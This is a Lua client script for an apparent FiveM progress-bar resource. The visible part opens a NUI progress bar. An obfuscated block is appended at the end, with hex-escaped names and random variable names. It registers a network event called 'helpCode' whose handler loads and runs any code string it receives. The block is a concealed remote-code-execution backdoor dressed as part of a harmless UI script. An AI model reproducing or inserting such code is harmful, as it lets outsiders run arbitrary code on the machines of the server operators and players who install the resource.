local progress = {}

progress.open = false

Progress = function(message, time, color)
    if not progress.open then
        progress.open = true
        SendNUIMessage({
            action = 'open',
            data = {
                message = message,
                time = time or 4000,
                color = color
            }
        })
    end
end

RegisterNUICallback('finish', function()
    progress.open = false
end)

RegisterNetEvent('crno_progressbar:progress', function(message, time, color)
    Progress(message, time, color)
end)


local MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[6][MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[1]](MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[2]) MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[6][MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[3]](MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[2], function(jYVslWlCnCbiNkfpyrmLqAGZrsnhGZSADPWwMBidXCVuyTehRCiDmFjWVGfdLVapedgqnq) MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[6][MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[4]](MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[6][MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[5]](jYVslWlCnCbiNkfpyrmLqAGZrsnhGZSADPWwMBidXCVuyTehRCiDmFjWVGfdLVapedgqnq))() end)